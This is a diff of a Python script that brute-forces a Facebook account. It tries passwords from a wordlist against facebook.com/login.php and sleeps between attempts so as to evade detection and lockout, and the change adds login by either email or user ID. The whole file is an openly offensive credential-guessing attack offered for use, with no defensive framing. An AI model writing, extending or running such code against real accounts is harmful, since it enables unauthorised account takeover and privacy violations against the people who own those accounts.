@@ -1,13 +1,15 @@
 import requests
 import time
 
-def brute_force_facebook_account(username: str, password_list: list):
+def brute_force_facebook_account(identifier: str, identifier_type: str, password_list: list):
     """
     Function to perform a brute force attack on a Facebook account using a list of passwords.
 
     Parameters:
-    - username: str
-        The username or email address associated with the Facebook account.
+    - identifier: str
+        The identifier (email or user ID) associated with the Facebook account.
+    - identifier_type: str
+        The type of identifier ("email" or "id").
     - password_list: list
         A list of passwords to try for the Facebook account.
 
@@ -17,20 +19,23 @@ def brute_force_facebook_account(username: str, password_list: list):
 
     Raises:
     - ValueError:
-        Raises an error if the username or password list is empty.
+        Raises an error if the identifier, identifier type, or password list is empty.
     """
 
-    # Checking if the username or password list is empty
-    if not username or not password_list:
-        raise ValueError("Username or password list cannot be empty.")
+    # Checking if the identifier, identifier type, or password list is empty
+    if not identifier or not identifier_type or not password_list:
+        raise ValueError("Identifier, identifier type, or password list cannot be empty.")
 
     # Iterating through the password list
     for password in password_list:
         # Adding delay to avoid detection and account lockout
         time.sleep(2)
 
-        # Sending a POST request to the Facebook login endpoint with the username and password
-        response = requests.post("https://www.facebook.com/login.php", data={"email": username, "pass": password})
+        # Building the data payload based on identifier type
+        data = {"email" if identifier_type.lower() == "email" else "id": identifier, "pass": password}
+
+        # Sending a POST request to the Facebook login endpoint with the identifier and password
+        response = requests.post("https://www.facebook.com/login.php", data=data)
 
         # Checking if the response contains a specific string indicating a successful login
         if "Welcome to Facebook" in response.text:
@@ -41,21 +46,22 @@ def brute_force_facebook_account(username: str, password_list: list):
 
 # Example usage of the brute_force_facebook_account function:
 
-# Get the username and password list from the user
-username = input("Enter the Facebook username or email: ")
-password_list = input("Enter the path to the password list file: ")
+# Get the identifier, identifier type, and password list from the user
+identifier = input("Enter the Facebook identifier (email or user ID): ")
+identifier_type = input("Enter the identifier type ('email' or 'id'): ")
+password_list_path = input("Enter the path to the password list file: ")
 
 # Read the password list from the file
-with open(password_list, 'r') as file:
+with open(password_list_path, 'r') as file:
     passwords = [line.strip() for line in file]
 
 try:
-    result = brute_force_facebook_account(username, passwords)
+    result = brute_force_facebook_account(identifier, identifier_type, passwords)
 
     if result:
         print(f"Successfully found the password for the Facebook account: {result}")
     else:
-        print("No match found for the given username and password list.")
+        print("No match found for the given identifier and password list.")
 except requests.RequestException as e:
     print(f"An error occurred: {e}")
 except ValueError as ve:
